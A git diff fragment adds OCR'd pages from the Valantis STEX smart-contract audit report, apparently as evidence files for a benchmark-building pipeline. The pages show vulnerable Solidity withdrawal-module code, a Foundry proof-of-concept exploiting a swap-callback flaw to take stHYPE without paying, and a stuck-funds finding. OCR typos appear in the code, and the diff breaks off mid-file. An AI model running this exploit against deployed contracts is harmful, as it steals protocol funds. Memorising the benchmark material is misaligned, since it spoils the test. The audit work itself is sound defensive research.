++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [70, 57, 921, 148]<|/det|>Any balance transferred to the Sovereign Pool during this callback would be counted towards payment for the user. As such, it is possible to call sthYPEWithdrawalModule.update inside of the callback, where the surplus amount in HYPE is transferred directly.\n<|det|>text [70, 160, 909, 227]<|/det|>As a result, the entire amount can be used by the attacker to swap to sthYPE, without actual paying and thus directly stealing the value from the protocol.\n<|det|>text [69, 251, 909, 931]<|/det|>function update() external nonReentrant {\n    // Need to ensure that enough native token is reserved for settled LP withdrawals\n    // WARNING: This implementation assumes that there is no slashing enabled in the LST protocol\n    uint256 amountToken1ClaimableLPWithdrawalCache = amountToken1ClaimableLPWithdrawal;\n    if (address(this).balance <= amountToken1ClaimableLPWithdrawalCache)\n    {\n    return;\n    }\n\n    // Having a surplus balance of native token means that new unstaking requests have been fulfilled\n    uint256 balanceSurplus = address(this).balance - amountToken1ClaimableLPWithdrawalCache;\n    // stHYPE is rebase, hence no need for conversion\n    uint256 balanceSurplusToken0 = balanceSurplus;\n\n    uint256 amountToken0PendingUnstakingCache = amountToken0PendingUnstaking;\n    if (amountToken0PendingUnstakingCache > balanceSurplusToken0) {\n    _amountToken0PendingUnstaking =\n    amountToken0PendingUnstakingCache - balanceSurplusToken0;\n    } else {\n    _amountToken0PendingUnstaking = 0;\n    }\n\n    // Prioritize LP withdrawal requests\n    uint256 amountToken1PendingLPWithdrawalCache =\n    amountToken1PendingLPWithdrawal;\n\n    if (balanceSurplus > amountToken1PendingLPWithdrawalCache) {\n    balanceSurplus -= amountToken1PendingLPWithdrawalCache;\n    amountToken1ClaimableLPWithdrawal += amountToken1PendingLPWithdrawalCache;\n    }\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>15\n", "page_image_sha256": "0d779a79d8df9931a4c27c2e28b4cfb164abacef3a43753817d89819e1fbceed", "page_number": 15, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [70, 57, 921, 148]<|/det|>Any balance transferred to the Sovereign Pool during this callback would be counted towards payment for the user. As such, it is possible to call sthYPEWithdrawalModule.update inside of the callback, where the surplus amount in HYPE is transferred directly.\n<|det|>text [70, 160, 909, 227]<|/det|>As a result, the entire amount can be used by the attacker to swap to sthYPE, without actual paying and thus directly stealing the value from the protocol.\n<|det|>text [69, 251, 909, 931]<|/det|>function update() external nonReentrant {\n    // Need to ensure that enough native token is reserved for settled LP withdrawals\n    // WARNING: This implementation assumes that there is no slashing enabled in the LST protocol\n    uint256 amountToken1ClaimableLPWithdrawalCache = amountToken1ClaimableLPWithdrawal;\n    if (address(this).balance <= amountToken1ClaimableLPWithdrawalCache)\n    {\n    return;\n    }\n\n    // Having a surplus balance of native token means that new unstaking requests have been fulfilled\n    uint256 balanceSurplus = address(this).balance - amountToken1ClaimableLPWithdrawalCache;\n    // stHYPE is rebase, hence no need for conversion\n    uint256 balanceSurplusToken0 = balanceSurplus;\n\n    uint256 amountToken0PendingUnstakingCache = amountToken0PendingUnstaking;\n    if (amountToken0PendingUnstakingCache > balanceSurplusToken0) {\n    _amountToken0PendingUnstaking =\n    amountToken0PendingUnstakingCache - balanceSurplusToken0;\n    } else {\n    _amountToken0PendingUnstaking = 0;\n    }\n\n    // Prioritize LP withdrawal requests\n    uint256 amountToken1PendingLPWithdrawalCache =\n    amountToken1PendingLPWithdrawal;\n\n    if (balanceSurplus > amountToken1PendingLPWithdrawalCache) {\n    balanceSurplus -= amountToken1PendingLPWithdrawalCache;\n    amountToken1ClaimableLPWithdrawal += amountToken1PendingLPWithdrawalCache;\n    }\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>15\n", "page_image_sha256": "0d779a79d8df9931a4c27c2e28b4cfb164abacef3a43753817d89819e1fbceed", "page_number": 15, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 436.18}, "timing_ms": {"decode": 1089, "sglang_total": 1300, "ttft": 210}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 475, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 753}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1944}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 68, 899, 507]<|/det|>cumulativeAmountToken1ClaimableLPWithdrawal += amountToken1PendingLPWithdrawalCache;\namountToken1PendingLPWithdrawal = 0;\n} else {\namountToken1PendingLPWithdrawal -= balanceSurplus;\namountToken1ClaimableLPWithdrawal += balanceSurplus;\ncumulativeAmountToken1ClaimableLPWithdrawal += balanceSurplus;\nbalanceSurplus = 0;\nreturn;\n}\n\n// Wrap native token into token1 and re-deposit into the pool\nISTEXAMM stexInterface = ISTEXAMM(stex);\naddress token1Address = stexInterface.token1();\nIWETH9 token1 = IWETH9(token1Address);\n\ntoken1.deposit{value: balanceSurplus}();\n// Pool reserves are measured as balances, hence we can replenish it with token1\n// by transferring directly\ntoken1.safeTransfer(stexInterface.pool(), balanceSurplus);\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>16\n", "page_image_sha256": "a8d79859f0dd76dfd61823c321aefd12c639c918c17009195d61fa87b9e1d3c3", "page_number": 16, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 68, 899, 507]<|/det|>cumulativeAmountToken1ClaimableLPWithdrawal += amountToken1PendingLPWithdrawalCache;\namountToken1PendingLPWithdrawal = 0;\n} else {\namountToken1PendingLPWithdrawal -= balanceSurplus;\namountToken1ClaimableLPWithdrawal += balanceSurplus;\ncumulativeAmountToken1ClaimableLPWithdrawal += balanceSurplus;\nbalanceSurplus = 0;\nreturn;\n}\n\n// Wrap native token into token1 and re-deposit into the pool\nISTEXAMM stexInterface = ISTEXAMM(stex);\naddress token1Address = stexInterface.token1();\nIWETH9 token1 = IWETH9(token1Address);\n\ntoken1.deposit{value: balanceSurplus}();\n// Pool reserves are measured as balances, hence we can replenish it with token1\n// by transferring directly\ntoken1.safeTransfer(stexInterface.pool(), balanceSurplus);\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>16\n", "page_image_sha256": "a8d79859f0dd76dfd61823c321aefd12c639c918c17009195d61fa87b9e1d3c3", "page_number": 16, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 456.0}, "timing_ms": {"decode": 500, "sglang_total": 704, "ttft": 203}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 228, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 506}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 825}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [73, 57, 275, 76]<|/det|>Proof-of-concept:\n<|det|>text [97, 106, 790, 858]<|/det|>function testPoC() public {\n    _addPoolReserves(10 ether, 10 ether);\n\n    uint token0Balance = token0.balanceOf(address(this));\n    uint token1Balance = weth.balanceOf(address(this));\n\n    (uint reserve0, uint reserve1) = pool.getReserves();\n    console.log(\"reserve0: %e\", reserve0);\n    console.log(\"reserve1: %e\", reserve1);\n\n    withdrawalModule.unstateToken0Reserves(5 ether);\n    vm.deal(address(overseer), 5 ether);\n\n    (reserve0, reserve1) = pool.getReserves();\n    console.log(\"reserve0: %e\", reserve0);\n    console.log(\"reserve1: %e\", reserv1);\n\n    token0.approve(address(state), 1000 ether);\n    weth.approve(address(state), 1000 ether);\n    token0.approve(address(pool), 1000 ether);\n    weth.approve(address(pool), 1000 ether);\n\n    SovereignPoolSwapParams memory params;\n    params.isZeroTooOne = false;\n    params.amountIn = 5 ether;\n    params.deadline = block.timestamp;\n    params.swapTokenOut = address(token0); // stHYPE\n    params.recipient = address(this);\n    params.isSwapCallback = true;\n\n    (uint256 amountInUsed, uint256 amountOut) = pool.swap(params);\n    console.log(\"amountInUsed: %s\", amountInUsed);\n    console.log(\"amountOut: %s\", amountOut);\n\n    (reserve0, reserve1) = pool.getReserves();\n    console.log(\"reserve0: %s\", reserve0);\n    console.log(\"reserve1: %s\", reserve1);\n<|det|>page_number [912, 955, 935, 969]<|/det|>17\n", "page_image_sha256": "c76d2c4a9d5d167101cb97535bbad8de00f4e24014ca12179aeabf3b10e10f0b", "page_number": 17, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [73, 57, 275, 76]<|/det|>Proof-of-concept:\n<|det|>text [97, 106, 790, 858]<|/det|>function testPoC() public {\n    _addPoolReserves(10 ether, 10 ether);\n\n    uint token0Balance = token0.balanceOf(address(this));\n    uint token1Balance = weth.balanceOf(address(this));\n\n    (uint reserve0, uint reserve1) = pool.getReserves();\n    console.log(\"reserve0: %e\", reserve0);\n    console.log(\"reserve1: %e\", reserve1);\n\n    withdrawalModule.unstateToken0Reserves(5 ether);\n    vm.deal(address(overseer), 5 ether);\n\n    (reserve0, reserve1) = pool.getReserves();\n    console.log(\"reserve0: %e\", reserve0);\n    console.log(\"reserve1: %e\", reserv1);\n\n    token0.approve(address(state), 1000 ether);\n    weth.approve(address(state), 1000 ether);\n    token0.approve(address(pool), 1000 ether);\n    weth.approve(address(pool), 1000 ether);\n\n    SovereignPoolSwapParams memory params;\n    params.isZeroTooOne = false;\n    params.amountIn = 5 ether;\n    params.deadline = block.timestamp;\n    params.swapTokenOut = address(token0); // stHYPE\n    params.recipient = address(this);\n    params.isSwapCallback = true;\n\n    (uint256 amountInUsed, uint256 amountOut) = pool.swap(params);\n    console.log(\"amountInUsed: %s\", amountInUsed);\n    console.log(\"amountOut: %s\", amountOut);\n\n    (reserve0, reserve1) = pool.getReserves();\n    console.log(\"reserve0: %s\", reserve0);\n    console.log(\"reserve1: %s\", reserve1);\n<|det|>page_number [912, 955, 935, 969]<|/det|>17\n", "page_image_sha256": "c76d2c4a9d5d167101cb97535bbad8de00f4e24014ca12179aeabf3b10e10f0b", "page_number": 17, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 434.739}, "timing_ms": {"decode": 996, "sglang_total": 1206, "ttft": 210}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 433, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 711}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1466}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 65, 885, 278]<|/det|>console.log(\"+ sthYPE.balance = %e\", token0.balanceOf(address(this)) - token0Balance);\nconsole.log(\"+ wHYPE.balance = %e\", weth.balanceOf(address(this)) - token1Balance);\nfunction sovereignPoolSwapCallback(MockSType token, uint amount, bytes calldata) external {\n    overseer.settleBurn(1);\n    withdrawalModule.update();\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>18\n", "page_image_sha256": "e9294cbeb0e1aa1745023856fb6c75bb5e03681688f01cbd2920708f46b89d2e", "page_number": 18, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 65, 885, 278]<|/det|>console.log(\"+ sthYPE.balance = %e\", token0.balanceOf(address(this)) - token0Balance);\nconsole.log(\"+ wHYPE.balance = %e\", weth.balanceOf(address(this)) - token1Balance);\nfunction sovereignPoolSwapCallback(MockSType token, uint amount, bytes calldata) external {\n    overseer.settleBurn(1);\n    withdrawalModule.update();\n}\n<|det|>page_number [910, 955, 937, 970]<|/det|>18\n", "page_image_sha256": "e9294cbeb0e1aa1745023856fb6c75bb5e03681688f01cbd2920708f46b89d2e", "page_number": 18, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 471.264}, "timing_ms": {"decode": 261, "sglang_total": 461, "ttft": 200}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 123, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 401}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 418}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl
+new file mode 100644
+index 0000000..5e01a09
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl
+@@ -0,0 +1,2 @@
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [71, 56, 186, 72]<|/det|>VLTS3-3\n<|det|>title [70, 96, 915, 224]<|/det|>LOSS OF FUNDS WHEN SETTING A\nNEW LENDINGMODULE WITH\nSTHYPEWITHDRAWALMODULE::SETPR\nOPOSEDLENDINGMODULE\n<|det|>text [72, 255, 207, 275]<|/det|>SEVERITY:\n<|det|>text [309, 256, 369, 275]<|/det|>High\n<|det|>title [71, 309, 259, 328]<|/det|>REMEDIATION:\n<|det|>text [70, 344, 928, 424]<|/det|>We recommend to set the withdraw receiver as the SovereignPool, such that the withdrawn tokens would simply be counted as reserve. Afterwards, the owner can re-deposit any amount of assets back into the new lending module using supplyToken1ToLendingPool.\n<|det|>text [72, 457, 305, 476]<|/det|>STATUS: Fixed\n<|det|>title [71, 510, 259, 529]<|/det|>DESCRIPTION:\n<|det|>text [70, 544, 500, 563]<|/det|>When a new lendingModule is set via\n<|det|>text [70, 567, 878, 633]<|/det|>stHYPEWithdrawalModule::setProposedLendingModule the wrapped native token is transferred from the current lendingModule to the stHYPEWithdrawalModule contract:\n<|det|>text [97, 657, 852, 716]<|/det|>if (address(LendingModule) != address(0)) {\n    lendingModule.withdraw(LendingModule.assetBalance(), address(this));\n}\n<|det|>text [70, 748, 905, 838]<|/det|>As a consequence, these funds may be stuck in the stHYPEWithdrawalModule contract since they are not transferred to the new lending module (lendingModuleProposal.lendingModule) and there is also no other way to transfer the withdrawn tokens.\n<|det|>page_number [910, 955, 937, 970]<|/det|>19\n", "page_image_sha256": "351e8ba5c5a2bf35bd3a09bd73994b8efa65741dc4f1af870d5e8a62710a1854", "page_number": 19, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [71, 56, 186, 72]<|/det|>VLTS3-3\n<|det|>title [70, 96, 915, 224]<|/det|>LOSS OF FUNDS WHEN SETTING A\nNEW LENDINGMODULE WITH\nSTHYPEWITHDRAWALMODULE::SETPR\nOPOSEDLENDINGMODULE\n<|det|>text [72, 255, 207, 275]<|/det|>SEVERITY:\n<|det|>text [309, 256, 369, 275]<|/det|>High\n<|det|>title [71, 309, 259, 328]<|/det|>REMEDIATION:\n<|det|>text [70, 344, 928, 424]<|/det|>We recommend to set the withdraw receiver as the SovereignPool, such that the withdrawn tokens would simply be counted as reserve. Afterwards, the owner can re-deposit any amount of assets back into the new lending module using supplyToken1ToLendingPool.\n<|det|>text [72, 457, 305, 476]<|/det|>STATUS: Fixed\n<|det|>title [71, 510, 259, 529]<|/det|>DESCRIPTION:\n<|det|>text [70, 544, 500, 563]<|/det|>When a new lendingModule is set via\n<|det|>text [70, 567, 878, 633]<|/det|>stHYPEWithdrawalModule::setProposedLendingModule the wrapped native token is transferred from the current lendingModule to the stHYPEWithdrawalModule contract:\n<|det|>text [97, 657, 852, 716]<|/det|>if (address(LendingModule) != address(0)) {\n    lendingModule.withdraw(LendingModule.assetBalance(), address(this));\n}\n<|det|>text [70, 748, 905, 838]<|/det|>As a consequence, these funds may be stuck in the stHYPEWithdrawalModule contract since they are not transferred to the new lending module (lendingModuleProposal.lendingModule) and there is also no other way to transfer the withdrawn tokens.\n<|det|>page_number [910, 955, 937, 970]<|/det|>19\n", "page_image_sha256": "351e8ba5c5a2bf35bd3a09bd73994b8efa65741dc4f1af870d5e8a62710a1854", "page_number": 19, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 433.888}, "timing_ms": {"decode": 1021, "sglang_total": 1229, "ttft": 208}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 443, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 721}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1504}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 65, 899, 445]<|/det|>function setProposedLendingModule() external onlyOwner {\n    if (lendingModuleProposal.startTimestamp > block.timestamp) {\n    revert\n    sthYPEWithdrawalModule__setProposedLendingModule_ProposalNotActive();\n    }\n\n    if (lendingModuleProposal.startTimestamp == 0) {\n    revert\n    sthYPEWithdrawalModule__setProposedLendingModule_InactiveProposal();\n    }\n\n    if (address(lendingModule) != address(0)) {\n    lendingModule.withdraw(lendingModule.assetBalance(), address(this));\n    }\n\n    lendingModule = lLendingModule(lendingModuleProposal.lendingModule);\n    delete lendingModuleProposal;\n    emit LendingModuleSet(address(lendingModule));\n}\n<|det|>page_number [907, 955, 939, 970]<|/det|>20\n", "page_image_sha256": "0f3477c2110eaf2f92113e7b1eef8a858fbaf6f9581eedd3a9a21fa92b3acc46", "page_number": 20, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 65, 899, 445]<|/det|>function setProposedLendingModule() external onlyOwner {\n    if (lendingModuleProposal.startTimestamp > block.timestamp) {\n    revert\n    sthYPEWithdrawalModule__setProposedLendingModule_ProposalNotActive();\n    }\n\n    if (lendingModuleProposal.startTimestamp == 0) {\n    revert\n    sthYPEWithdrawalModule__setProposedLendingModule_InactiveProposal();\n    }\n\n    if (address(lendingModule) != address(0)) {\n    lendingModule.withdraw(lendingModule.assetBalance(), address(this));\n    }\n\n    lendingModule = lLendingModule(lendingModuleProposal.lendingModule);\n    delete lendingModuleProposal;\n    emit LendingModuleSet(address(lendingModule));\n}\n<|det|>page_number [907, 955, 939, 970]<|/det|>20\n", "page_image_sha256": "0f3477c2110eaf2f92113e7b1eef8a858fbaf6f9581eedd3a9a21fa92b3acc46", "page_number": 20, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 459.016}, "timing_ms": {"decode": 427, "sglang_total": 632, "ttft": 204}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 196, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 474}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0017_0020.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 741}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl
+new file mode 100644
+index 0000000..0cbd070
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl
+@@ -0,0 +1,5 @@
